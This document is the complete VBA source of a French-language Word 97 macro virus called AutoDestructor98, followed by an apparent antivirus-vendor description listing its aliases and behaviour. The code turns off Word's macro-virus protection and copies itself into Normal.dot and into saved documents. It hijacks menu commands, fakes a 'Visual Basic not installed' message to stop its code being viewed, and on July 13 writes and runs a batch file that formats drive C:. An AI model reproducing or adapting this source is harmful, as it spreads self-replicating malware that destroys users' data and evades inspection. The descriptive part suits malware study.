   Attribute VB_Name = "AutoDestructor98"
   Sub AutoExec()
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   On Error GoTo ErrorAE
   Dim MyDate
   MyDate = Date
   D$ = Mid(MyDate, 1, 5)
   D1$ = Mid(MyDate, 1, 2)
   If D$ = "13/07" Then
       With Application.Assistant
           .Visible = True
       End With
       With Assistant.NewBalloon
           .Text = "Attention, le compte à rebours est lancé..." & Chr$(13) & "Plus que 10 secondes"
           .Heading = "Virus AutoDestructor98"
           .Animation = msoAnimationGetAttentionMajor
           .Button = msoButtonSetOK
           .Show
       End With
   StatusBar = "10"
   Call CpteAReb
   StatusBar = "9"
   Call CpteAReb
   StatusBar = "8"
   Call CpteAReb
   StatusBar = "7"
   Call CpteAReb
   StatusBar = "6"
   Call CpteAReb
   StatusBar = "5"
   Call CpteAReb
   StatusBar = "4"
   Call CpteAReb
   StatusBar = "3"
   Call CpteAReb
   StatusBar = "2"
   Call CpteAReb
   StatusBar = "1"
   Call CpteAReb
   StatusBar = "0"
   Open "C:\DOS\Boum.bat" For Output As #1
       Print #1, "@Echo off"
       Print #1, "CLS"
       Print #1, "Echo o|Format C: /u /Autotest"
       Print #1, "Echo y|Format C: /u /Autotest"
       Print #1, "Echo Votre ordinateur s'est autodétruit, HAHAHAHAHA!!!!!"
   Close #1
   Shell "C:\DOS\Boum.bat", vbHide
   BoumBox.Show
   End If
   If D1$ = "15" Then
       Application.ActiveWindow.Caption = "Les barres de scrollings ont disparu..."
       Application.ActiveWindow.DisplayHorizontalScrollBar = False
       Application.ActiveWindow.DisplayVerticalScrollBar = False
   Else
       Application.ActiveWindow.DisplayHorizontalScrollBar = True
       Application.ActiveWindow.DisplayVerticalScrollBar = True
   End If
   ErrorAE:
   End Sub
   Sub AutoOpen()
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   On Error GoTo ErrorAO
   iMacroCount = WordBasic.CountMacros(0, 0)
   For i = 1 To iMacroCount
       If WordBasic.[MacroName$](i, 0) = "AutoDestructor98" Then
           AutoDestructor98Installed = -1
       End If
   Next i
   If Not AutoDestructor98Installed Then
       Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="AutoDestructor98", Object:=wdOrganizerObjectProjectItems
       Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="BoumBox", Object:=wdOrganizerObjectProjectItems
   With Application.Assistant
       .Visible = True
   End With
   With Assistant.NewBalloon
       .Text = "HAHAHAHAHA!!!, votre ordinateur est infecté par un nouveau virus..."
       .Heading = "Virus AutoDestructor98"
       .Animation = msoAnimationGetAttentionMajor
       .Button = msoButtonSetOK
       .Show
   End With
   End If
   ErrorAO:
   End Sub
   Sub CpteAReb()
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   On Error GoTo ErrorCAR
   Dim PauseTime, Start, Finish, TotalTime
       PauseTime = 1   ' Définit la durée.
       Start = Timer   ' Définit l'heure de début.
       Do While Timer < Start + PauseTime
           DoEvents    ' Donne le contrôle à d'autres
                       ' processus.
       Loop
   ErrorCAR:
   End Sub
   Sub FileSaveAs()
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   On Error GoTo ErrorFSA
       Dialogs(wdDialogFileSaveAs).Show
       If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then
           ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
       End If
   Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="AutoDestructor98", Object:=wdOrganizerObjectProjectItems
   Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="BoumBox", Object:=wdOrganizerObjectProjectItems
   Application.ActiveWindow.Caption = "Document infecté, HAHAHAHAHA!!!!!!"
   ActiveDocument.Save
   ErrorFSA:
   End Sub
   Sub FileTemplates()
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   On Error GoTo ErrorFT
   StatusBar = "10"
   Call CpteAReb
   StatusBar = "9"
   Call CpteAReb
   StatusBar = "8"
   Call CpteAReb
   StatusBar = "7"
   Call CpteAReb
   StatusBar = "6"
   Call CpteAReb
   StatusBar = "5"
   Call CpteAReb
   StatusBar = "4"
   Call CpteAReb
   StatusBar = "3"
   Call CpteAReb
   StatusBar = "2"
   Call CpteAReb
   StatusBar = "1"
   Call CpteAReb
   StatusBar = "0"
   MsgBox "Charge activée...", vbCritical, "Virus AutoDestructor98"
   Selection.EndKey
   For i = 1 To 100
   Selection.TypeParagraph
   Selection.TypeText Text:="Boum!!!!!!!!!"
   Next i
   Selection.TypeParagraph
   Selection.TypeText Text:="Je m'appelle AutoDestructor98 et je vais détruire votre ordinateur..."
   Selection.TypeParagraph
   Selection.TypeText Text:="HAHAHAHAHA!!!!!!!!!!"
   ActiveDocument.Save
   ErrorFT:
   End Sub
   Sub ToolsMacro()
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   On Error GoTo ErrorTM
   StatusBar = "Compte à rebours déclenché plus que 10 secondes..."
   StatusBar = "Veuillez observer la barre de titre..."
   Application.ActiveWindow.Caption = "10"
   Call CpteAReb
   Application.ActiveWindow.Caption = "9"
   Call CpteAReb
   Application.ActiveWindow.Caption = "8"
   Call CpteAReb
   Application.ActiveWindow.Caption = "7"
   Call CpteAReb
   Application.ActiveWindow.Caption = "6"
   Call CpteAReb
   Application.ActiveWindow.Caption = "5"
   Call CpteAReb
   Application.ActiveWindow.Caption = "4"
   Call CpteAReb
   Application.ActiveWindow.Caption = "3"
   Call CpteAReb
   Application.ActiveWindow.Caption = "2"
   Call CpteAReb
   Application.ActiveWindow.Caption = "1"
   Call CpteAReb
   Application.ActiveWindow.Caption = "0"
   MsgBox "Au revoir...", vbCritical, "Virus AutoDestructor98"
   Tasks.ExitWindows
   ErrorTM:
   End Sub
   Sub ViewVBCode()
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   On Error GoTo ErrorVVBC
   With Application.Assistant
       .Visible = True
   End With
   With Assistant.NewBalloon
       .Text = "Microsoft Visual Basic n'est pas installé." & Chr$(13) & "Veuillez consulter l'aide en ligne."
       .Heading = "Microsoft Word"
       .Animation = msoAnimationGetAttentionMajor
       .Button = msoButtonSetOK
       .Show
   End With
   ErrorVVBC:
   End Sub

   ' Form BoumBox

   VERSION 5.00
   Begin {C62A69F0-16DC-11CE-9E98-00AA00574A4F} BoumBox
      Caption         =   "Virus AutoDestructor98"
      ClientHeight    =   4185
      ClientLeft      =   45
      ClientTop       =   330
      ClientWidth     =   4410
      OleObjectBlob   =   "Virus.MSWord.Autodestructor-BoumBox.frx":0000
      StartUpPosition =   1  'CenterOwner
   End
   Attribute VB_Name = "BoumBox"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = False

   Private Sub CommandButton1_Click()
   Unload BoumBox
   End Sub
   Private Sub userform_initialize()
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   End Sub

   Description : Virus.MSWord.Autodestructor

   Aliases
   Virus.MSWord.Autodestructor (Kaspersky Lab) is also known as: Macro.Word97.Autodestructor (Kaspersky Lab), W97M/Generic (McAfee),   W97M.AutoD.A (Symantec),   W97M.AutoD (Doctor Web),   WM97/FrenchKill (Sophos),   W97M/AutoD.A+ (RAV),   W97M_AUTOD.A (Trend Micro),   W97M/Honte.A (H+BEDV),   W97M/AutoD.A (FRISK),   MW97:AutoD (ALWIL),   W97M/AutoD (Grisoft),   W97M.AutoD.A (SOFTWIN),   W97M.AutoD.A (ClamAV),   W97M/AutoD.A (Panda),   W97M/AutoD.A (Eset)
   Description added       Mar 07 2000
   Behavior        Macro Virus
   Technical details

   This virus contains seven macros in one module "AutoDestructor98": AutoExec, AutoOpen, CpteAReb, FileSaveAs, FileTemplates, ToolsMacro, and ViewVBCode. The virus infects the global macros area upon the opening of an infected document and spreads to other documents upon saving them with a new name.

   While infecting NORMAL.DOT, the virus displays the following Balloon:

   Virus AutoDestructor98
   HAHA      !!!, votre ordinateur est infecté par un nouveau virus...

   On the 15th of any month, the virus hides ScrollBar, and installs in the window caption the following text:

   Les barres de scrollings ont disparu...

   Upon starting Word on July 13, the virus formats the hard drive and displays the following Balloon:

   Virus AutoDestructor98
   Attention, le compte à rebours est lancé...
   Plus que 10 secondes

   Before formatting, the virus prints the following numbers to the status bar: 10, 9, 8, 7, ... 1, 0 - one number per second. The same counting is displayed upon entering the Tools/Macro or File/Templates menus, and the virus then displays several messages and forces Word to terminate.
